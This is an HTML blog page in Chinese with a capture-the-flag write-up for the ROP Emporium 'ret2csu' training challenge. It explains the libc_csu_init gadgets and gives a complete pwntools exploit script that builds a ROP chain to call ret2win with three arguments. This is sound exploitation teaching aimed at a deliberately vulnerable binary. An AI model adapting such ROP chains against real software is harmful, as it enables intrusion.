@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>(dailyPwn)ROP Emporium:ret2csu | WeeryeeBlog</title>
+    <meta name="generator" content="VuePress 1.8.2">
+    <link rel="icon" href="/favicon.png">
+    <meta name="description" content="blog">
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+    
+    <link rel="preload" href="/assets/css/0.styles.ae95ec04.css" as="style"><link rel="preload" href="/assets/js/app.8409c641.js" as="script"><link rel="preload" href="/assets/js/3.d64ec8cf.js" as="script"><link rel="preload" href="/assets/js/1.9478132b.js" as="script"><link rel="preload" href="/assets/js/14.aa5d139d.js" as="script"><link rel="prefetch" href="/assets/js/10.1a40c848.js"><link rel="prefetch" href="/assets/js/11.d69978aa.js"><link rel="prefetch" href="/assets/js/12.3630887e.js"><link rel="prefetch" href="/assets/js/13.5650f4d2.js"><link rel="prefetch" href="/assets/js/15.3f9868d2.js"><link rel="prefetch" href="/assets/js/16.40ebe2e2.js"><link rel="prefetch" href="/assets/js/17.414452c2.js"><link rel="prefetch" href="/assets/js/18.2780f4cd.js"><link rel="prefetch" href="/assets/js/19.04d76501.js"><link rel="prefetch" href="/assets/js/20.d951a677.js"><link rel="prefetch" href="/assets/js/21.eb342ad4.js"><link rel="prefetch" href="/assets/js/4.3c366cb4.js"><link rel="prefetch" href="/assets/js/5.b77ebd03.js"><link rel="prefetch" href="/assets/js/6.627dbd4e.js"><link rel="prefetch" href="/assets/js/7.9d86af04.js"><link rel="prefetch" href="/assets/js/8.ebbf1ee8.js"><link rel="prefetch" href="/assets/js/9.721c0070.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.ae95ec04.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container no-sidebar" data-v-5bb33761><div data-v-5bb33761><div class="password-shadow password-wrapper-out" style="display:none;" data-v-59e6cb88 data-v-5bb33761 data-v-5bb33761><h3 class="title" data-v-59e6cb88>WeeryeeBlog</h3> <p class="description" data-v-59e6cb88>blog</p> <label id="box" class="inputBox" data-v-59e6cb88><input type="password" value="" data-v-59e6cb88> <span data-v-59e6cb88>Konck! Knock!</span> <button data-v-59e6cb88>OK</button></label> <div class="footer" data-v-59e6cb88><span data-v-59e6cb88><i class="iconfont reco-theme" data-v-59e6cb88></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-59e6cb88>vuePress-theme-reco</a></span> <span data-v-59e6cb88><i class="iconfont reco-copyright" data-v-59e6cb88></i> <a data-v-59e6cb88><span data-v-59e6cb88>weeryee</span>
+          
+        <!---->
+        2022
+      </a></span></div></div> <div class="hide" data-v-5bb33761><header class="navbar" data-v-5bb33761><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/logo.png" alt="WeeryeeBlog" class="logo"> <span class="site-name">WeeryeeBlog</span></a> <div class="links"><div class="color-picker"><a class="color-button"><i class="iconfont reco-color"></i></a> <div class="color-picker-menu" style="display:none;"><div class="mode-options"><h4 class="title">Choose mode</h4> <ul class="color-mode-options"><li class="dark">dark</li><li class="auto active">auto</li><li class="light">light</li></ul></div></div></div> <div class="search-box"><i class="iconfont reco-search"></i> <input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link"><i class="iconfont reco-home"></i>
+  Home
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-category"></i>
+      Category
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/8086汇编/" class="nav-link"><i class="undefined"></i>
+  8086汇编
+</a></li><li class="dropdown-item"><!----> <a href="/categories/pwn/" class="nav-link"><i class="undefined"></i>
+  pwn
+</a></li><li class="dropdown-item"><!----> <a href="/categories/知识图谱/" class="nav-link"><i class="undefined"></i>
+  知识图谱
+</a></li></ul></div></div><div class="nav-item"><a href="/tag/" class="nav-link"><i class="iconfont reco-tag"></i>
+  Tag
+</a></div><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont reco-date"></i>
+  TimeLine
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-message"></i>
+      Docs
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/docs/theme-reco/" class="nav-link"><i class="undefined"></i>
+  vuepress-reco
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-message"></i>
+      Contact
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/Weeryee" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont reco-github"></i>
+  GitHub
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask" data-v-5bb33761></div> <aside class="sidebar" data-v-5bb33761><div class="personal-info-wrapper" data-v-1fad0c41 data-v-5bb33761><img src="/avatar.png" alt="author-avatar" class="personal-img" data-v-1fad0c41> <h3 class="name" data-v-1fad0c41>
+    weeryee
+  </h3> <div class="num" data-v-1fad0c41><div data-v-1fad0c41><h3 data-v-1fad0c41>11</h3> <h6 data-v-1fad0c41>Articles</h6></div> <div data-v-1fad0c41><h3 data-v-1fad0c41>6</h3> <h6 data-v-1fad0c41>Tags</h6></div></div> <ul class="social-links" data-v-1fad0c41></ul> <hr data-v-1fad0c41></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link"><i class="iconfont reco-home"></i>
+  Home
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-category"></i>
+      Category
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/8086汇编/" class="nav-link"><i class="undefined"></i>
+  8086汇编
+</a></li><li class="dropdown-item"><!----> <a href="/categories/pwn/" class="nav-link"><i class="undefined"></i>
+  pwn
+</a></li><li class="dropdown-item"><!----> <a href="/categories/知识图谱/" class="nav-link"><i class="undefined"></i>
+  知识图谱
+</a></li></ul></div></div><div class="nav-item"><a href="/tag/" class="nav-link"><i class="iconfont reco-tag"></i>
+  Tag
+</a></div><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont reco-date"></i>
+  TimeLine
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-message"></i>
+      Docs
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/docs/theme-reco/" class="nav-link"><i class="undefined"></i>
+  vuepress-reco
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-message"></i>
+      Contact
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/Weeryee" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont reco-github"></i>
+  GitHub
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav> <!----> </aside> <div class="password-shadow password-wrapper-in" style="display:none;" data-v-59e6cb88 data-v-5bb33761><h3 class="title" data-v-59e6cb88>(dailyPwn)ROP Emporium:ret2csu</h3> <!----> <label id="box" class="inputBox" data-v-59e6cb88><input type="password" value="" data-v-59e6cb88> <span data-v-59e6cb88>Konck! Knock!</span> <button data-v-59e6cb88>OK</button></label> <div class="footer" data-v-59e6cb88><span data-v-59e6cb88><i class="iconfont reco-theme" data-v-59e6cb88></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-59e6cb88>vuePress-theme-reco</a></span> <span data-v-59e6cb88><i class="iconfont reco-copyright" data-v-59e6cb88></i> <a data-v-59e6cb88><span data-v-59e6cb88>weeryee</span>
+          
+        <!---->
+        2022
+      </a></span></div></div> <div data-v-5bb33761><div data-v-5bb33761><main class="page"><section style="display:;"><div class="page-title"><h1 class="title">(dailyPwn)ROP Emporium:ret2csu</h1> <div data-v-8a445198><i class="iconfont reco-account" data-v-8a445198><span data-v-8a445198>weeryee</span></i> <i class="iconfont reco-date" data-v-8a445198><span data-v-8a445198>9/23/2022</span></i> <!----> <i class="tags iconfont reco-tag" data-v-8a445198><span class="tag-item" data-v-8a445198>pwn</span><span class="tag-item" data-v-8a445198>ctf</span><span class="tag-item" data-v-8a445198>dailyPwn</span></i></div></div> <div class="theme-reco-content content__default"><h2 id="题目"><a href="#题目" class="header-anchor">#</a> 题目</h2> <p>今天尝试一下ROP Emporium中的ret2csu：<a href="https://ropemporium.com/challenge/ret2csu.html" target="_blank" rel="noopener noreferrer">ret2csu<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>下载好附件后，我们阅读一下题目要求：</p> <blockquote><p>This challenge is very similar to &quot;callme&quot;, with the exception of the useful gadgets. Simply call the function in the accompanying library with same arguments that you used to beat the &quot;callme&quot; challenge ( for the ARM &amp; MIPS binaries, for the x86_64 binary. <code>ret2win()``ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d)``ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</code></p> <p>Populating the elusive 3rd register using ROP can prove more difficult than you might expect, especially in smaller binaries with fewer gadgets. This can become particularly irksome since many useful GLIBC functions require three arguments.</p></blockquote> <h2 id="分析"><a href="#分析" class="header-anchor">#</a> 分析</h2> <p>可以看到，题目的意思是让我们传入三个参数调用ret2win，即：<code>ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</code>。我们知道64位程序传入参数的方式是依靠寄存器实现的，即按照 <code>rdi，rsi，rdx，rcx，r8，r9</code>的顺序传递的，多余的参数再从栈上读取。传入前两个参数我们可以用ROPgadget中的：
+ <img src="/image/ret2csu_wp/1663999680221.png">
+而最大的困难是在于传入第三个参数：rdx。我们可以发现，在ROPgadget中并没有与rdx有关的内容，那如何传入rdx呢？这里就要用到ret2csu的技巧了。</p> <p>libc_csu_init是elf程序启动过程中的函数，linux程序启动过程如下：
+ <img src="/image/ret2csu_wp/1664001540337.png"></p> <p>因此，大部分程序中都含有这部分内容。用IDA反编译一下：
+ <img src="/image/ret2csu_wp/1664001669757.png"></p> <p>通过阅读这两部分的代码，我们发现，可以先执行gadget2来设置rsp，rbx，rbp等寄存器的值，然后再跳转至gadget1，通过 <code>r15--&gt;rdx;r14--&gt;rsi;r13d--&gt;edi</code>来控制rdx，rsi和edi。</p> <p>这其中还有不少细节需要注意：</p> <ul><li>在gadget1中会调用frame_dummy_init_array函数，为了让程序正常运行，我们需要将r12设置为0x600DF0，rbx=0</li> <li>这其中包含函数：<code>cmp rbp,rbx;jnz short loc_400680</code>。当rbp==rbx时，函数才会向下执行，否则会一直循环，所以我们需要把rbx=0，rbp=1；</li> <li>剩余没有用的寄存器用字符填充即可</li> <li>在gadget1执行完后，会通过jnz跳转至gadget2，故需再设置一次寄存器值。</li></ul> <h2 id="exp"><a href="#exp" class="header-anchor">#</a> EXP</h2> <p>最后exp如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">&quot;amd64&quot;</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">&quot;linux&quot;</span><span class="token punctuation">)</span>
+pwnfile <span class="token operator">=</span> <span class="token string">&quot;./ret2csu&quot;</span>
+io <span class="token operator">=</span> process<span class="token punctuation">(</span>pwnfile<span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>pwnfile<span class="token punctuation">)</span>
+rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>pwnfile<span class="token punctuation">)</span>
+
+padding <span class="token operator">=</span> <span class="token number">0x28</span>
+
+csu1_addr <span class="token operator">=</span> <span class="token number">0x400680</span>
+<span class="token triple-quoted-string string">'''
+mov     rdx, r15
+mov     rsi, r14
+mov     edi, r13d
+call    ds:(__frame_dummy_init_array_entry - 600DF0h)[r12+rbx*8]
+add     rbx, 1
+cmp     rbp, rbx
+jnz     short loc_400680
+'''</span>
+csu2_addr <span class="token operator">=</span> <span class="token number">0x400696</span>
+<span class="token triple-quoted-string string">'''
+loc_400696:
+add     rsp, 8
+pop     rbx
+pop     rbp
+pop     r12
+pop     r13
+pop     r14
+pop     r15
+retn
+'''</span>
+
+win_addr <span class="token operator">=</span> <span class="token number">0x400510</span>
+array_init_addr <span class="token operator">=</span> <span class="token number">0x600DF0</span>
+pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x4006a3</span>
+pop_rsi_r15_addr <span class="token operator">=</span> <span class="token number">0x4006a1</span> 
+
+payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">b&quot;a&quot;</span><span class="token operator">*</span>padding <span class="token punctuation">)</span>
+
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span>csu2_addr<span class="token punctuation">)</span>  <span class="token comment">#进入第二个gadget，设置寄存器</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>   <span class="token comment">#对应add rsp, 8</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">#rbx</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">#rbp</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span>array_init_addr<span class="token punctuation">)</span>  <span class="token comment">#r12--&gt;call array_init</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>  <span class="token comment">#r13d--&gt;edi</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token number">0xcafebabecafebabe</span><span class="token punctuation">)</span>  <span class="token comment">#r14--&gt;rsi</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token number">0xd00df00dd00df00d</span><span class="token punctuation">)</span>  <span class="token comment">#r15---&gt;rdx</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span>csu1_addr<span class="token punctuation">)</span>  <span class="token comment">#进入gadget1设置，但后面还会从gadget2中ret，所以要填充寄存器值</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token string">b&quot;deadbeef&quot;</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token comment"># 对应gadget2设置。</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token number">0xdeadbeefdeadbeef</span><span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span>pop_rsi_r15_addr<span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token number">0xcafebabecafebabe</span><span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>
+
+delimiter <span class="token operator">=</span> <span class="token string">&quot;&gt; &quot;</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delimiter <span class="token punctuation">,</span> payload <span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br></div></div><p>不知道是什么原因，我的机器在运行后rsi=0，因此我用ROPgadget重新设置了rdi和rsi。最后flag：
+ <img src="/image/ret2csu_wp/1664002412978.png"></p></div></section> <footer class="page-edit"><!----> <!----></footer> <!----> <div class="comments-wrapper"><!----></div> <ul class="side-bar sub-sidebar-wrapper" style="width:12rem;" data-v-ac050c62><li class="level-2" data-v-ac050c62><a href="/blogs/Pwn/ret2csu_wp.html#题目" class="sidebar-link reco-side-题目" data-v-ac050c62>题目</a></li><li class="level-2" data-v-ac050c62><a href="/blogs/Pwn/ret2csu_wp.html#分析" class="sidebar-link reco-side-分析" data-v-ac050c62>分析</a></li><li class="level-2" data-v-ac050c62><a href="/blogs/Pwn/ret2csu_wp.html#exp" class="sidebar-link reco-side-exp" data-v-ac050c62>EXP</a></li></ul></main></div> <!----></div></div></div></div><div class="global-ui"><div class="back-to-ceiling" style="right:1rem;bottom:6rem;width:2.5rem;height:2.5rem;border-radius:.25rem;line-height:2.5rem;display:none;" data-v-c6073ba8 data-v-c6073ba8><svg t="1574745035067" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5404" class="icon" data-v-c6073ba8><path d="M526.60727968 10.90185116a27.675 27.675 0 0 0-29.21455937 0c-131.36607665 82.28402758-218.69155461 228.01873535-218.69155402 394.07834331a462.20625001 462.20625001 0 0 0 5.36959153 69.94390903c1.00431239 6.55289093-0.34802892 13.13561351-3.76865779 18.80351572-32.63518765 54.11355614-51.75690182 118.55860487-51.7569018 187.94566865a371.06718723 371.06718723 0 0 0 11.50484808 91.98906777c6.53300375 25.50556257 41.68394495 28.14064038 52.69160883 4.22606766 17.37162448-37.73630017 42.14135425-72.50938081 72.80769204-103.21549295 2.18761121 3.04276886 4.15646224 6.24463696 6.40373557 9.22774369a1871.4375 1871.4375 0 0 0 140.04691725 5.34970492 1866.36093723 1866.36093723 0 0 0 140.04691723-5.34970492c2.24727335-2.98310674 4.21612437-6.18497483 6.3937923-9.2178004 30.66633723 30.70611158 55.4360664 65.4791928 72.80769147 103.21549355 11.00766384 23.91457269 46.15860503 21.27949489 52.69160879-4.22606768a371.15156223 371.15156223 0 0 0 11.514792-91.99901164c0-69.36717486-19.13165746-133.82216804-51.75690182-187.92578088-3.42062944-5.66790279-4.76302748-12.26056868-3.76865837-18.80351632a462.20625001 462.20625001 0 0 0 5.36959269-69.943909c-0.00994388-166.08943902-87.32547796-311.81420293-218.6915546-394.09823051zM605.93803103 357.87693858a93.93749974 93.93749974 0 1 1-187.89594924 6.1e-7 93.93749974 93.93749974 0 0 1 187.89594924-6.1e-7z" p-id="5405" data-v-c6073ba8></path><path d="M429.50777625 765.63860547C429.50777625 803.39355007 466.44236686 1000.39046097 512.00932183 1000.39046097c45.56695499 0 82.4922232-197.00623328 82.5015456-234.7518555 0-37.75494459-36.9345906-68.35043303-82.4922232-68.34111062-45.57627738-0.00932239-82.52019037 30.59548842-82.51086798 68.34111062z" p-id="5406" data-v-c6073ba8></path></svg></div><div class="kanbanniang" data-v-5775ee02><div class="banniang-container" style="display:;" data-v-5775ee02><div class="messageBox" style="right:68px;bottom:290px;display:none;" data-v-5775ee02>
+      欢迎来到我的博客
+    </div> <div class="operation" style="right:90px;bottom:40px;display:;" data-v-5775ee02><i class="kbnfont kbn-ban-home ban-home" data-v-5775ee02></i> <i class="kbnfont kbn-ban-message message" data-v-5775ee02></i> <i class="kbnfont kbn-ban-close close" data-v-5775ee02></i> <a target="_blank" href="https://vuepress-theme-reco.recoluan.com/views/plugins/kanbanniang.html" data-v-5775ee02><i class="kbnfont kbn-ban-info info" data-v-5775ee02></i></a> <i class="kbnfont kbn-ban-theme skin" style="display:;" data-v-5775ee02></i></div> <canvas id="banniang" width="250" height="320" class="live2d" style="right:90px;bottom:-20px;opacity:0.9;" data-v-5775ee02></canvas></div> <div class="showBanNiang" style="display:none;" data-v-5775ee02>
+    看板娘
+  </div></div><canvas id="vuepress-canvas-cursor"></canvas><!----><div class="RibbonAnimation"></div></div></div>
+    <script src="/assets/js/app.8409c641.js" defer></script><script src="/assets/js/3.d64ec8cf.js" defer></script><script src="/assets/js/1.9478132b.js" defer></script><script src="/assets/js/14.aa5d139d.js" defer></script>
+  </body>
+</html>
